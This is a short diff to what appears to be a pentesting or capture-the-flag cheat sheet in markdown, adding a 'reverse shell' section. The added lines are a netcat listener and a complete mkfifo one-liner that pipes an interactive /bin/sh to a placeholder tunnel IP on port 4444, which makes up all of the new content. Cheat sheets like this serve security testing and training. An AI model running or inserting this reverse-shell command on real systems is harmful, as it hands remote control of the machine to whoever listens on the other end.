@@ -192,6 +192,13 @@ view
 pdf @main
 ```
 
+## reverse shell
+```
+nc -lvnp 4444
+rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc <Tunnel IP> 4444 >/tmp/f
+
+```
+
 
 ## CVE
 
